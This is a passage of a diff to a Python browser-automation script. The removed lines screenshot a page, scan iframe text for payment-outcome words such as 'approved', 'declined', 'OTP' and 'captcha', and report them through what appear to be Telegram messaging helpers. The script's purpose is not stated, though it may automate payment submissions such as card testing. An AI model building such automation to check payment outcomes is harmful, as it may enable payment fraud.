-
-    time.sleep(15)
-
-    # 12. النتيجة
-    tg_msg("🔄 [12] Reading result...")
-    time.sleep(10)
-    try:
-        page.screenshot(path="/tmp/result.png", full_page=True)
-        tg_photo("/tmp/result.png", "📸 Result")
-    except Exception:
-        pass
-
-    try:
-        iframe_text = frame.evaluate("() => document.body.innerText")
-        lines = []
-        for line in iframe_text.split("\n"):
-            l = line.strip()
-            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
-                                             "thank","confirm","failed","reject","captcha",
-                                             "verified","otp","verification","limit","enter"]):
-                lines.append(l)
-        if lines:
-            tg_msg("📊 Result:\n" + "\n".join(lines[:30]))
-        else:
-            tg_msg("⚠️ no keywords. preview:\n<pre>" + iframe_text[:2000] + "</pre>")
-    except Exception as e:
-        tg_msg(f"⚠️ read: {str(e)[:150]}")
-
-    tg_msg("✅ DONE")
-
+    tg_msg("✅ DONE — send inspection results")
+    
     try: context.close()
     except: pass
     try: browser.close()
     except: pass
     try: pw.stop()
     except: pass
-
 
 if __name__ == "__main__":
     try:
